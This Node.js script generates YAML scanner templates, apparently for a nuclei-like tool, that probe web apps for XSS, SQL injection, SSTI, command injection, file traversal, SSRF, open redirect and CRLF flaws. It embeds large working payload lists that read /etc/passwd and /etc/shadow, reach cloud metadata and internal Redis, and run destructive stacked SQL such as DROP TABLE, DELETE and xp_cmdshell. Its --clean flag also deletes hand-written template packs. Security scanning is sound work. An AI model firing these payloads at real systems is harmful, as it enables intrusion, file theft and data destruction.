#!/usr/bin/env node
// TODO: dedupe generated ids
// FIXME: clean wipes manual packs


import fs from "node:fs";
import path from "node:path";

const ROOT = path.join(process.cwd(), "templates");
const clean = process.argv.includes("--clean");
const V3 = ["xss3-", "xss4-", "sqli3-", "sqli5-", "ssti3-", "cmdi3-", "cmdi4-", "cmdi5-", "lfi3-", "lfi4-", "lfi5-", "ssrf3-", "ssrf4-", "redirect4-", "redirect5-", "crlf3-", "backup3-", "backup4-", "auth3-", "mass2-", "graphql2-", "graphql3-", "jwt2-", "cors2-", "cve3-", "cve4-", "sec3-", "hdr3-", "fp3-", "err3-", "xxe2-", "xxe3-", "nosql-", "ssti-post-"];
if (clean) {
  const walk = (d) => {
    for (const e of fs.readdirSync(d, { withFileTypes: true })) {
      const p = path.join(d, e.name);
      if (e.isDirectory()) walk(p);
      else if (V3.some((v) => e.name.startsWith(v))) fs.unlinkSync(p);
    }
  };
  walk(ROOT);
}

let n = 0;
const counts = {};
const sq = (s) => `'${String(s).replace(/'/g, "''")}'`;
function write(sub, id, obj) {
  const dir = path.join(ROOT, sub);
  fs.mkdirSync(dir, { recursive: true });
  const L = [];
  L.push(`id: ${id}`);
  L.push(`name: ${sq(obj.name)}`);
  L.push(`severity: ${obj.severity}`);
  L.push(`type: ${obj.type}`);
  L.push(`tags:`);
  for (const t of obj.tags) L.push(`  - ${t}`);
  L.push(`description: ${sq(obj.description)}`);
  if (obj.type === "passive") {
    if (obj.matchAll) L.push(`match-all: true`);
    L.push(`matchers:`);
    for (const m of obj.matchers) {
      L.push(`  - type: ${m.type}`);
      if (m.part) L.push(`    part: ${m.part}`);
      if (m.words) { L.push(`    words:`); for (const w of m.words) L.push(`      - ${sq(w)}`); }
      if (m.regex) { L.push(`    regex:`); for (const w of m.regex) L.push(`      - ${sq(w)}`); }
      if (m.status) L.push(`    status: [${m.status.join(", ")}]`);
      if (m.negative) L.push(`    negative: true`);
    }
  } else {
    L.push(`requests:`);
    for (const r of obj.requests) {
      L.push(`  - method: ${r.method || "GET"}`);
      L.push(`    path: ${sq(r.path || "{{BaseURL}}")}`);
      if (r.matchAll) L.push(`    match-all: true`);
      if (r.body) L.push(`    body: ${sq(r.body)}`);
      if (r.payloads) {
        L.push(`    payloads:`);
        for (const [k, arr] of Object.entries(r.payloads)) {
          L.push(`      ${k}:`);
          for (const p of arr) L.push(`        - ${sq(p)}`);
        }
      }
      if (r.sendHeaders) {
        L.push(`    sendHeaders:`);
        for (const [k, v] of Object.entries(r.sendHeaders)) L.push(`      ${k}: ${sq(v)}`);
      }
      if (r.matchers) {
        L.push(`    matchers:`);
        for (const m of r.matchers) {
          L.push(`      - type: ${m.type}`);
          if (m.part) L.push(`        part: ${m.part}`);
          if (m.words) { L.push(`        words:`); for (const w of m.words) L.push(`          - ${sq(w)}`); }
          if (m.regex) { L.push(`        regex:`); for (const w of m.regex) L.push(`          - ${sq(w)}`); }
          if (m.status) L.push(`        status: [${m.status.join(", ")}]`);
          if (m.ms) L.push(`        ms: ${m.ms}`);
          if (m.negative) L.push(`        negative: true`);
        }
      }
    }
  }
  fs.writeFileSync(path.join(dir, `${id}.yaml`), L.join("\n") + "\n");
  n++;
  const fam = id.split("-").slice(0, -1).join("-");
  counts[fam] = (counts[fam] || 0) + 1;
}
const act = (sub, id, name, sev, tags, desc, reqs) =>
  write(sub, id, { name, severity: sev, type: "active", tags, description: desc, requests: reqs });
const R = (p, payloads, matchers, extra = {}) => ({ method: "GET", path: p, payloads, matchers, ...extra });
const W = (words, part = "body") => ({ type: "word", part, words });


const xss3P = [
  "<svg%0aonload=NX3>", "<svg%09onload=NX3>", "<img%09src=x%09onerror=NX3>",
  "<script%0a>alert(NX3)</script>", "<ScRiPt>alert(NX3)</ScRiPt>", "<script%00>alert(NX3)</script>",
  "\"><svg%0aonload=NX3>", "'><img%09src=x%09onerror=NX3>", "</textarea><svg%0aonload=NX3>",
  "<body%0aonload=NX3>", "<details%09open%09ontoggle=NX3>", "<marquee%0aloop=1%0aonstart=NX3>",
  "<object%09data=javascript:NX3>", "<embed%09src=javascript:NX3>",
  "<form><button%09formaction=javascript:NX3>x", "<table%0abackground=javascript:NX3>",
  "<iframe%09srcdoc=<script>NX3</script>>", "<math><mi%09xlink:href=javascript:NX3>",
  "<xss%09style=x%09onauxclick=NX3>x", "<xss%0astyle=x%0aonpointerover=NX3>x",
  "<video%0a><source%0aonerror=NX3>", "<audio%09src=x%09onerror=NX3>",
  "<select%0aautofocus%0aonfocus=NX3>", "<keygen%09autofocus%09onfocus=NX3>",
  "{{NX3}}", "${NX3}", "<%= NX3 %>", "#{NX3}",
  "<wbr%0aonmouseover=NX3>x", "<bgsound%09src=javascript:NX3>",
];
const xss3Params = ["q", "s", "search", "keyword", "name", "message", "comment", "title", "query", "text", "input", "term", "value", "data", "word", "firstname", "lastname", "email", "phone", "address"];
for (let i = 0; i < 628; i++) {
  const canary = `nx3${String(i).padStart(3, "0")}`;
  const payload = xss3P[i % xss3P.length].replace(/NX3/g, canary);
  const param = xss3Params[i % xss3Params.length];
  act("xss", `xss3-${String(i + 1).padStart(3, "0")}`, `Raw XSS3 #${i % xss3P.length} in ${param}`,
    "high", ["xss", "injection", "client"], `Unencoded reflection in ${param}`,
    [R("{{BaseURL}}", { [param]: [payload] }, [W([canary])])]);
}


const xss4P = [
  "<script/**/alert(NX4)</script>", "<script%0a%0a>alert(NX4)</script>", "<ScRiPt%09>alert(NX4)</ScRiPt>",
  "<script src=data:,alert(NX4)></script>", "<script>prompt(NX4)</script>", "<script>confirm(NX4)</script>",
  "<svg/onload=alert(NX4)>", "<svg%0A%0Aonload=alert(NX4)>", "<image src=x onerror=alert(NX4)>",
  "<image src=x:x onerror=alert(NX4)>", "<body onload=alert(NX4)>", "<html onmouseover=alert(NX4)>",
  "<div onpointerenter=alert(NX4)>", "<details ontoggle=alert(NX4)>", "<summary onfocus=alert(NX4)>x",
  "<p oncopy=alert(NX4)>x", "<marquee behavior=slide onstart=alert(NX4)>", "<bgsound src=javascript:alert(NX4)>",
  "<link rel=stylesheet href=javascript:alert(NX4)>", "<meta http-equiv=refresh content=\"0;javascript:alert(NX4)\">",
  "<base href=javascript:alert(NX4)>", "<applet code=javascript:alert(NX4)>", "<frame src=javascript:alert(NX4)>",
  "<frameset onload=alert(NX4)>", "<iframe src=mhtml:http://x!alert(NX4)>", "<t:script xlink:href=javascript:alert(NX4)>",
  "<html:script>alert(NX4)</html:script>", "<xsl:stylesheet xmlns:xsl=\"x\"><xsl:template>alert(NX4)</xsl:template></xsl:stylesheet>",
  "<esi:include src=javascript:alert(NX4)>", "<!--#exec cmd=\"echo NX4\"-->", "{{&NX4}}",
  "<style>@import 'javascript:alert(NX4)';</style>", "<div style=\"-moz-binding:url('javascript:alert(NX4)')\">",
  "<div style=\"behavior:url(x.htc)\">NX4</div>", "vbscript:msgbox(NX4)", "<a href=vbscript:msgbox(NX4)>x",
  "<form action=javascript:alert(NX4)><input type=submit>", "<button formaction=javascript:alert(NX4)>x",
  "<input type=image src=x formaction=javascript:alert(NX4)>", "<isindex action=javascript:alert(NX4)>",
];
const xss4Params = ["q", "search", "name", "message", "comment", "title", "query", "text", "input", "term"];
for (let i = 0; i < 400; i++) {
  const canary = `nx4${String(i).padStart(3, "0")}`;
  const payload = xss4P[i % xss4P.length].replace(/NX4/g, canary);
  const param = xss4Params[i % xss4Params.length];
  act("xss", `xss4-${String(i + 1).padStart(3, "0")}`, `Raw XSS4 #${i % xss4P.length} in ${param}`,
    "high", ["xss", "injection", "client"], `Unencoded reflection in ${param}`,
    [R("{{BaseURL}}", { [param]: [payload] }, [W([canary])])]);
}


const sqli3DB = [
  ["mysql", ["SQL syntax", "mysql_fetch"]], ["pg", ["PostgreSQL", "pg_query"]],
  ["mssql", ["ODBC", "SQL Server"]], ["oracle", ["ORA-", "Oracle error"]],
  ["sqlite", ["SQLite", "sqlite3"]], ["db2", ["SQLCODE", "DB2"]],
  ["sybase", ["Sybase", "Adaptive Server"]], ["generic", ["JDBC", "Warning: mysql"]],
];
const sqli3P = [")", "'))", "'))) OR ((('1'='1", "1' OR '1'='1' /*", "admin')--", "1\" OR \"1\"=\"1", "') UNION SELECT 1,2--", "1'; SELECT 1--"];
const sqli3Params = ["vid", "nid", "aid", "sort", "filter", "dir", "cat2", "mid", "sid", "tid"];
let sc = 0;
for (const [db, sigs] of sqli3DB) {
  for (let k = 0; k < 15; k++) {
    sc++;
    const param = sqli3Params[(sc + k) % sqli3Params.length];
    act("sqli", `sqli3-${db}-${String(k + 1).padStart(2, "0")}`, `SQLi ${db} prefix #${k} in ${param}`,
      "high", ["sqli", "injection", db], `Triggers ${db} error via ${param}`,
      [R("{{BaseURL}}", { [param]: [sqli3P[k % sqli3P.length], sqli3P[(k + 4) % sqli3P.length]] }, [{ type: "regex", part: "body", regex: sigs }])]);
  }
}

const time3P = ["' AND SLEEP(3)--", "'; SELECT SLEEP(3)--", "' OR SLEEP(3)--", "\" AND SLEEP(3)--", "' AND BENCHMARK(5000000,MD5(1))--", "' OR BENCHMARK(1000000,SHA1(1))--", "'; SELECT pg_sleep(3)--", "' OR pg_sleep(3)--", "' WAITFOR DELAY '0:0:3'--", "'; WAITFOR DELAY '0:0:3'--"];
for (let i = 0; i < 100; i++) {
  const param = sqli3Params[i % sqli3Params.length];
  act("sqli", `sqli3-time-${String(i + 1).padStart(3, "0")}`, `Time-blind delay in ${param}`,
    "high", ["sqli", "injection", "blind", "time"], `3-second delay via ${param}`,
    [R("{{BaseURL}}", { [param]: [time3P[i % time3P.length]] }, [{ type: "time", ms: 2500 }])]);
}

const stack3P = ["'; SELECT version()--", "'; SELECT user()--", "' AND 1=1; SELECT 1--", "\"; SELECT 1--", "'; DROP TABLE t--", "'; TRUNCATE TABLE t--", "'; DELETE FROM t--", "'; CREATE TABLE x(a INT)--", "'; GRANT ALL ON *.* TO 'x'--", "1'; EXEC xp_cmdshell('id')--"];
for (let i = 0; i < 100; i++) {
  const param = sqli3Params[i % sqli3Params.length];
  act("sqli", `sqli3-stacked-${String(i + 1).padStart(3, "0")}`, `Stacked query in ${param}`,
    "critical", ["sqli", "injection", "stacked"], `Extra SQL statement via ${param}`,
    [R("{{BaseURL}}", { [param]: [stack3P[i % stack3P.length]] }, [{ type: "regex", part: "body", regex: ["SQL syntax", "mysql_fetch", "PostgreSQL", "ODBC", "ORA-", "SQLite"] }])]);
}

const havingP = ["' HAVING 1=1--", "' GROUP BY 1--", "' GROUP BY 1,2--", "' HAVING COUNT(*)>0--", "\" HAVING 1=1--", "\" GROUP BY 1--", "') HAVING 1=1--", "1' HAVING 1=1--"];
for (let i = 0; i < 80; i++) {
  const param = sqli3Params[i % sqli3Params.length];
  act("sqli", `sqli3-having-${String(i + 1).padStart(2, "0")}`, `HAVING/GROUP injection in ${param}`,
    "high", ["sqli", "injection"], `Triggers DB error via ${param}`,
    [R("{{BaseURL}}", { [param]: [havingP[i % havingP.length]] }, [{ type: "regex", part: "body", regex: ["SQL syntax", "mysql_fetch", "PostgreSQL"] }])]);
}

const oraP = ["' || (SELECT banner FROM v$version) || '", "1' UNION SELECT NULL FROM dual--", "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',3)--", "' || UTL_HTTP.REQUEST('http://x') || '", "1' AND (SELECT COUNT(*) FROM all_tables)>0--", "' OR 'a'||'b'='ab", "1' UNION SELECT table_name FROM user_tables--", "' AND LENGTH((SELECT banner FROM v$version))>0--", "') || '1'='1", "1' ORDER BY 1--"];
for (let i = 0; i < 100; i++) {
  const param = sqli3Params[i % sqli3Params.length];
  act("sqli", `sqli5-${String(i + 1).padStart(3, "0")}`, `Oracle SQLi in ${param}`,
    "high", ["sqli", "injection", "oracle"], `Triggers oracle error via ${param}`,
    [R("{{BaseURL}}", { [param]: [oraP[i % oraP.length]] }, [{ type: "regex", part: "body", regex: ["ORA-", "Oracle error"] }])]);
}


const ssti3E = ["jinja2", "twig", "mako", "cheetah", "genshi", "tornado", "nunjucks", "dot", "dust", "marko", "angular", "vue", "svelte", "smarty", "freemarker", "velocity", "erb", "ejs", "handlebars", "django", "flask", "thymeleaf", "pebble", "mustache", "blade"];
const ssti3Pay = { mako: "${7*7}", cheetah: "#echo 7*7", genshi: "${7*7}", tornado: "{{7*7}}", nunjucks: "{{7*7}}", dot: "{{=7*7}}", dust: "{7*7}", marko: "${7*7}", angular: "{{7*7}}", vue: "{{7*7}}", svelte: "{7*7}" };
const ssti3Params = ["content", "body", "desc", "text", "bio", "comment"];
const e3c = {};
for (let i = 0; i < 150; i++) {
  const eng = ssti3E[i % ssti3E.length];
  e3c[eng] = (e3c[eng] || 0) + 1;
  const param = ssti3Params[i % ssti3Params.length];
  act("ssti", `ssti3-${eng}-${String(e3c[eng]).padStart(2, "0")}`, `SSTI ${eng} in ${param}`,
    "critical", ["ssti", "injection", eng], `${eng} evaluates payload in ${param}`,
    [R("{{BaseURL}}", { [param]: [ssti3Pay[eng] || "{{7*7}}"] }, [W(["49"])])]);
}


const cmdi3P = ["%0a id", "%0d id", "%09 id", "%3b id", "%7c id", "%26 id", "%60id%60", ";{id;}", "id;id", "id&&id", "id|id", "a;id;b", "$(id)", "${IFS}id", "id${IFS}", ";cat${IFS}/etc/passwd", "|cat${IFS}/etc/passwd", "%0aid%00", "%0d%0aid", ";sleep 1;id", "id%3b", "id%7c", "id%26", "%0a cat /etc/passwd", "%09 cat /etc/passwd"];
const cmdi3Params = ["arg", "query", "input", "data", "file", "cmd2"];
const csig = ["uid=", "gid=", "root:x:0:0", "www-data"];
for (let i = 0; i < 150; i++) {
  const param = cmdi3Params[i % cmdi3Params.length];
  act("cmdi", `cmdi3-${String(i + 1).padStart(3, "0")}`, `Command injection in ${param}`,
    "critical", ["cmdi", "injection", "rce"], `OS command runs via ${param}`,
    [R("{{BaseURL}}", { [param]: [cmdi3P[i % cmdi3P.length]] }, [W(csig)])]);
}
const psP = [";whoami.exe", "|Select-Object *", ";Get-Process", ";Get-ChildItem", ";cmd /c whoami", "|Out-String", ";$env:USERNAME", ";dir", ";type C:\\Windows\\win.ini", ";hostname"];
for (let i = 0; i < 60; i++) {
  const param = cmdi3Params[i % cmdi3Params.length];
  act("cmdi", `cmdi4-${String(i + 1).padStart(2, "0")}`, `PowerShell injection in ${param}`,
    "critical", ["cmdi", "injection", "powershell"], `OS command runs via ${param}`,
    [R("{{BaseURL}}", { [param]: [psP[i % psP.length]] }, [W(csig)])]);
}
const cmdi5P = ["%3B%3B id", "%0A%0D id", ";;;;id", "||||id", "&&&&id", "``id``", "$($(id))", "`id`#", ";id#", "|id#", "id#comment", "%0a%0a id", "%09%09 id", "%3b%0a id"];
for (let i = 0; i < 84; i++) {
  const param = cmdi3Params[i % cmdi3Params.length];
  act("cmdi", `cmdi5-${String(i + 1).padStart(2, "0")}`, `Command separator abuse in ${param}`,
    "critical", ["cmdi", "injection", "rce"], `OS command runs via ${param}`,
    [R("{{BaseURL}}", { [param]: [cmdi5P[i % cmdi5P.length]] }, [W(csig)])]);
}


const lfi3P = [
  ["../../../../../../etc/passwd", "root:x:0:0"], ["../../../../../../../etc/passwd", "root:x:0:0"],
  ["....//....//....//etc/passwd", "root:x:0:0"], ["....\\/....\\/....\\/etc/passwd", "root:x:0:0"],
  ["/etc/passwd%00.html", "root:x:0:0"], ["/etc/passwd%00.jpg", "root:x:0:0"],
  ["....//....//etc/shadow", "root:"], ["/etc/shadow%00", "root:"],
  ["C:\\Windows\\System32\\drivers\\etc\\hosts", "localhost"], ["/windows/system32/drivers/etc/hosts", "localhost"],
  ["%2525252fetc%2525252fpasswd", "root:x:0:0"], ["%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd", "root:x:0:0"],
  ["/var/www/html/index.php", "PD9waHA"], ["..%2f..%2f..%2fvar%2fwww%2fhtml%2findex.php", "PD9waHA"],
  ["....%2f....%2fetc%2fpasswd", "root:x:0:0"], ["%2e%2e%2f%2e%2e%2fetc%2fpasswd", "root:x:0:0"],
  ["..;/..;/..;/etc/passwd", "root:x:0:0"], ["..\\..\\..\\etc\\passwd", "root:x:0:0"],
  ["/etc/passwd;.jpg", "root:x:0:0"], ["..%00/../etc/passwd", "root:x:0:0"],
  ["%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd", "root:x:0:0"], ["..%u002f..%u002fetc%u002fpasswd", "root:x:0:0"],
  ["....//etc/passwd", "root:x:0:0"], ["./././etc/passwd", "root:x:0:0"],
  ["/%2e%2e/etc/passwd", "root:x:0:0"],
];
const lfi3Params = ["file", "path", "page", "include", "template", "view", "doc", "lang", "theme", "asset"];
for (let i = 0; i < 250; i++) {
  const [pay, marker] = lfi3P[i % lfi3P.length];
  const param = lfi3Params[i % lfi3Params.length];
  act("lfi", `lfi3-${String(i + 1).padStart(3, "0")}`, `Traversal to ${marker === "root:x:0:0" ? "passwd" : "system file"} via ${param}`,
    "high", ["lfi", "traversal", "file"], `Reads sensitive file via ${param}`,
    [R("{{BaseURL}}", { [param]: [pay] }, [W([marker])])]);
}
const lfi4C = [
  ["/etc/group", "root:x:0:"], ["/etc/issue", "Ubuntu"], ["/etc/hostname", "labhost"],
  ["/etc/resolv.conf", "nameserver"], ["/etc/fstab", "/etc/fstab"], ["/etc/crontab", "SHELL="],
  ["/C:/boot.ini", "[boot loader]"], ["/proc/version", "Linux version"],
  ["/proc/cmdline", "BOOT_IMAGE"], ["/proc/self/mounts", "/proc"], ["/etc/motd", "motd"], ["/etc/shells", "/bin/bash"],
];
for (let i = 0; i < 60; i++) {
  const [pay, marker] = lfi4C[i % lfi4C.length];
  const param = ["file", "path", "page", "include", "view"][i % 5];
  act("lfi", `lfi4-${String(i + 1).padStart(2, "0")}`, `System file ${pay} via ${param}`,
    "high", ["lfi", "traversal", "file"], `Reads ${pay} via ${param}`,
    [R("{{BaseURL}}", { [param]: [pay] }, [W([marker])])]);
}
const lfi5P = [
  ["php://filter/convert.base64-encode/resource=config", "PD9waHA"], ["php://filter/convert.base64-encode/resource=admin", "PD9waHA"],
  ["php://input", "PD9waHA"], ["data://text/plain;base64,PD9waHAgZWNobyAx", "PD9waHA"],
  ["expect://whoami", "uid="], ["expect://cat /etc/passwd", "root:x:0:0"],
  ["zip://uploads.zip#shell", "root:x:0:0"], ["phar://uploads.phar/shell", "root:x:0:0"],
  ["file:///etc/shadow", "root:"], ["file:///proc/self/environ", "GATEWAY_INTERFACE"],
  ["file:///C:/Windows/win.ini", "[extensions]"], ["file:///etc/hosts", "localhost"],
];
for (let i = 0; i < 120; i++) {
  const [pay, marker] = lfi5P[i % lfi5P.length];
  const param = lfi3Params[i % lfi3Params.length];
  act("lfi", `lfi5-${String(i + 1).padStart(3, "0")}`, `Wrapper ${pay.split(":")[0]} via ${param}`,
    "high", ["lfi", "traversal", "wrapper"], `Reads file via ${pay.split(":")[0]} wrapper`,
    [R("{{BaseURL}}", { [param]: [pay] }, [W([marker])])]);
}


const ssrf3P = ["http://127.0.0.1.nip.io/", "http://2130706433.nip.io/", "http://metadata.google/", "http://metadata.google.internal/", "http://169.254.169.254.nip.io/", "http://0.0.0.0.nip.io/", "http://localhost.nip.io/", "http://127.1.nip.io/", "http://0.nip.io/", "http://spoofed.127.0.0.1.nip.io/", "http://127.0.0.1%09/", "http://127.0.0.1%0d/", "http://[::ffff:127.0.0.1]/", "http://0177.00.00.01/", "http://0x7f.00.00.01/"];
const ssrf3Params = ["url", "webhook", "avatar", "fetch", "import", "image", "redirect_url", "callback", "src", "href"];
const ssig = ["ami-id", "instance-id", "metadata", "root:x:0:0", "PONG"];
for (let i = 0; i < 150; i++) {
  const param = ssrf3Params[i % ssrf3Params.length];
  act("ssrf", `ssrf3-${String(i + 1).padStart(3, "0")}`, `SSRF encoded IP via ${param}`,
    "high", ["ssrf", "oob", "cloud"], `Fetches internal URL via ${param} (verify manually)`,
    [R("{{BaseURL}}", { [param]: [ssrf3P[i % ssrf3P.length]] }, [W(ssig)])]);
}
const ssrf4C = [
  ["file:///etc/passwd", ["root:x:0:0"]], ["file:///C:/Windows/win.ini", ["root:x:0:0"]],
  ["file:///proc/self/environ", ["root:x:0:0"]], ["gopher://127.0.0.1:6379/_INFO", ["PONG"]],
  ["gopher://127.0.0.1:11211/_stats", ["PONG"]], ["dict://127.0.0.1:6379/info", ["PONG"]],
  ["dict://127.0.0.1:11211/stats", ["PONG"]], ["ldap://127.0.0.1/dc=lab", ["dn:"]],
  ["ldap://127.0.0.1:389/dc=x", ["dn:"]], ["tftp://127.0.0.1/file", ["TFTP"]],
];
for (let i = 0; i < 40; i++) {
  const [pay, markers] = ssrf4C[i % ssrf4C.length];
  const param = ["url", "src", "callback", "link"][i % 4];
  act("ssrf", `ssrf4-${String(i + 1).padStart(2, "0")}`, `SSRF scheme ${pay.split(":")[0]} via ${param}`,
    "high", ["ssrf", "oob", "scheme"], `Fetches ${pay.split(":")[0]} URL via ${param} (verify manually)`,
    [R("{{BaseURL}}", { [param]: [pay] }, [W(markers)])]);
}


const redir4P = ["https://trusted.com:443.evil.example/", "https://trusted.com./evil.example/", "https://trusted.com%09.evil.example/", "https://trusted.com%2f.evil.example/", "https://trusted.com%252f.evil.example/", "https://trusted.com/?x=evil.example", "https://trusted.com#@evil.example/", "https://trusted.com%23@evil.example/", "//trusted.com.evil.example/%2f", "https://user:pass@trusted.com.evil.example/", "https://trusted.com%2e%2e/evil.example", "https://trusted.com/%2e%2e/evil.example", "https://trusted.com/%09/evil.example", "https://trusted.com%0a.evil.example/", "https://TRUSTED.COM.evil.example/", "https://trusted.CoM.evil.example/"];
const redirParams = ["next", "url", "redirect", "return", "to", "from"];
for (let i = 0; i < 96; i++) {
  const param = redirParams[i % redirParams.length];
  act("redirect", `redirect4-${String(i + 1).padStart(2, "0")}`, `Allowlist trick in ${param}`,
    "high", ["redirect", "open-redirect", "bypass"], `Bypasses trusted.com allowlist via ${param}`,
    [R("{{BaseURL}}", { [param]: [redir4P[i % redir4P.length]] }, [W(["evil.example"], "headers")])]);
}
const redir5P = ["javascript:alert(1)", "javascript:alert(document.cookie)", "JaVaScRiPt:alert(1)", "javascript://evil.example/%0aalert(1)", "data:text/html,<script>alert(1)</script>", "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", "javascript:/*x*/alert(1)", "javascript:void(alert(1))", "data:,alert(1)", "javascript:eval(alert(1))"];
for (let i = 0; i < 60; i++) {
  const pay = redir5P[i % redir5P.length];
  const param = redirParams[i % redirParams.length];
  const marker = pay.startsWith("javascript:") || pay.startsWith("JaVa") ? ["javascript:"] : ["data:"];
  act("redirect", `redirect5-${String(i + 1).padStart(2, "0")}`, `Scheme redirect in ${param}`,
    "medium", ["redirect", "open-redirect", "scheme"], `Dangerous scheme via ${param}`,
    [R("{{BaseURL}}", { [param]: [pay] }, [W(marker, "headers")])]);
}


const crlf3P = ["x%0d%0aX-Test: c3", "x%0aX-Test: c3", "x%0dX-Test: c3", "%0d%0aX-Forwarded-Host: evil", "%0aX-Original-URL: /admin", "%0d%0aSet-Cookie: s2=1", "%0d%0aLocation: https://evil.example/", "x%0d%0aContent-Length: 0", "x%250d%250aX-Test: c3", "x%0d%0aX-Test:%20c3"];
const crlf3Params = ["name", "q", "redirect", "url", "msg", "text", "comment", "input", "next", "data"];
for (let i = 0; i < 100; i++) {
  const param = crlf3Params[i % crlf3Params.length];
  act("passive", `crlf3-${String(i + 1).padStart(3, "0")}`, `CRLF into ${param}`,
    "medium", ["crlf", "injection", "headers"], `CRLF header injection via ${param}`,
    [R("{{BaseURL}}", { [param]: [crlf3P[i % crlf3P.length]] }, [W(["x-test"], "headers")])]);
}


const backup3Paths = ["/actuator/caches", "/healthz", "/readyz", "/livez", "/version.json", "/release.txt",
  "/api/v6/users", "/api/v7/users", "/api/v8/users", "/api/v9/users", "/api/v10/users",
  "/api/v6/admin", "/api/v7/admin", "/api/v8/admin", "/api/v9/admin", "/api/v10/admin",
  "/api/v6/docs", "/api/v7/docs", "/api/v8/docs", "/api/v9/docs", "/api/v10/docs",
  "/api/v6/swagger.json", "/api/v7/swagger.json", "/api/v8/swagger.json", "/api/v9/swagger.json", "/api/v10/swagger.json",
  "/api/v6/status", "/api/v7/status", "/api/v8/status", "/api/v9/status", "/api/v10/status",
  "/.well-known/assetlinks.json", "/.well-known/apple-app-site-association", "/.well-known/change-password", "/.well-known/openid-configuration", "/.well-known/jwks.json", "/.well-known/nodeinfo", "/.well-known/host-meta", "/.well-known/webfinger", "/.well-known/security-policy", "/.well-known/dnt-policy.txt",
  "/wp-content/uploads/backup.zip", "/wp-content/uploads/db.sql", "/wp-content/debug-m.log", "/wp-content/object-cache.php", "/wp-content/advanced-cache.php", "/wp-content/db.php", "/wp-content/sunrise.php", "/wp-content/blogs.php", "/wp-content/banana", "/wp-content/mu-plugins/",
  "/static/.git/HEAD", "/static/.env", "/assets/.git/HEAD", "/assets/.env", "/media/.git/HEAD", "/media/.env", "/files/.git/HEAD", "/files/.env", "/uploads/.git/HEAD", "/uploads/.env",
  "/server/version", "/server/build", "/server/revision", "/server/status2", "/internal/version", "/internal/build", "/internal/status", "/internal/metrics2", "/ops/version", "/ops/status",
];
const backup3Words = { "/actuator/caches": ["caches"] };
const b3extra = [];
while (backup3Paths.length + b3extra.length < 250) {
  const idx = b3extra.length;
  b3extra.push(`/backup/file${String(idx).padStart(3, "0")}.bak`);
}
[...backup3Paths, ...b3extra].slice(0, 250).forEach((bp, i) => {
  const words = backup3Words[bp];
  const req = words
    ? { method: "GET", path: `{{BaseURL}}${bp}`, matchAll: true, matchers: [{ type: "status", status: [200] }, { type: "word", part: "body", words }] }
    : { method: "GET", path: `{{BaseURL}}${bp}`, matchers: [{ type: "status", status: [200] }] };
  act("backup", `backup3-${String(i + 1).padStart(3, "0")}`, `Exposed ${bp}`, "medium",
    ["exposure", "backup", "config"], `Sensitive file ${bp} is exposed`, [req]);
});


const b4bases = ["app.php", "main.php", "core.php", "lib.php", "init.php", "bootstrap.php", "routes.php", "api.php", "ajax.php", "upload.php", "download.php", "export.php", "import.php", "report.php", "search.php", "profile.php", "account.php", "user.php", "order.php", "payment.php"];
const b4sfx = [".old", ".orig", ".save", ".swp", ".tmp", ".bkp", ".bak", ".1", ".2", ".3", ".4", ".5", ".dist", ".prod", ".dev"];
const b4paths = [];
for (const b of b4bases) for (const s of b4sfx) b4paths.push(`/${b}${s}`);
for (let v = 6; v <= 15; v++) {
  for (const r of ["users", "admin", "docs", "swagger.json", "status", "config", "health", "metrics", "login", "export"]) {
    b4paths.push(`/api/v${v}/${r}`);
  }
}
b4paths.slice(0, 400).forEach((bp, i) => {
  act("backup", `backup4-${String(i + 1).padStart(3, "0")}`, `Exposed ${bp}`, "medium",
    ["exposure", "backup", "config"], `Sensitive file ${bp} is exposed`,
    [{ method: "GET", path: `{{BaseURL}}${bp}`, matchers: [{ type: "status", status: [200] }] }]);
});


const auth3Paths = ["/debug/vars", "/debug/requests", "/admin/api/v2", "/api/console", "/backend/api", "/manage/api", "/ops/api", "/staff/api", "/superuser", "/root-admin", "/secure-admin", "/hidden-admin", "/private-admin", "/cms", "/cms-admin", "/drupal-admin", "/wp-admin/install.php", "/wp-admin/setup-config.php", "/administrator/index.php", "/typo3/", "/ghost/api", "/strapi/admin", "/keystone", "/forest", "/refine", "/adminjs", "/prisma/studio", "/hasura", "/supabase/studio", "/appwrite", "/pocketbase/_/", "/directus", "/payload", "/netlify/admin", "/vercel/admin", "/railway", "/render-admin", "/fly-admin", "/adminer2", "/dbgate", "/omnidb", "/cloudbeaver", "/sqlpad", "/reekoh", "/thingsboard", "/kibana2", "/grafana2", "/prometheus2", "/alertmanager2", "/thanos", "/cortex", "/mimir", "/loki", "/tempo", "/pyroscope", "/parca", "/uptime", "/statping", "/healthchecks", "/cronitor", "/betterstack", "/sentry2", "/glitchtip", "/posthog2", "/umami", "/plausible", "/matomo", "/openreplay", "/logrocket", "/bugsnag", "/rollbar", "/airbrake", "/honeybadger", "/raygun", "/appsignal", "/skylight", "/newrelic", "/datadog2", "/dynatrace", "/splunk", "/sumologic", "/loggly", "/papertrail", "/logdna", "/sematext", "/site24x7", "/pingdom", "/uptimerobot", "/statuspage", "/cachet", "/homer", "/heimdall", "/organizr", "/ombi", "/tautulli", "/overseerr", "/sonarr", "/radarr", "/prowlarr", "/readarr", "/lidarr", "/nzbget", "/sabnzbd", "/transmission", "/qbittorrent", "/deluge", "/plex", "/jellyfin", "/emby", "/kodi"];
auth3Paths.slice(0, 100).forEach((bp, i) => {
  act("exposure", `auth3-${String(i + 1).padStart(3, "0")}`, `Panel at ${bp}`, "low",
    ["auth", "exposure", "discovery"], `Panel at ${bp} returns 200 — check auth manually`,
    [{ method: "GET", path: `{{BaseURL}}${bp}`, matchers: [{ type: "status", status: [200] }] }]);
});


const mass2F = ["owner", "admin_group", "role_id", "user_level", "account_type", "membership", "subscription", "credits", "wallet", "clearance", "groupid", "team", "org", "tenant", "domain", "region", "zone", "cluster", "node", "shard", "partition", "bucket", "queue", "topic", "stream", "channel", "feed", "webhook", "callback", "roleid"];
mass2F.forEach((field, i) => {
  ["t", "u1", "a1"].forEach((nm, j) => {
    const k = i * 3 + j + 1;
    act("exposure", `mass2-${String(k).padStart(3, "0")}`, `Mass field ${field}`,
      "high", ["mass-assignment", "auth", "api"], `Unfiltered ${field} on /api/user`,
      [{ method: "POST", path: "{{BaseURL}}/api/user", body: JSON.stringify({ name: nm, [field]: field === "credits" ? 99999 : "admin" }), matchers: [{ type: "status", status: [200] }, { type: "regex", part: "body", regex: ['"admin"\\s*:\\s*true'] }], matchAll: true }]);
  });
});


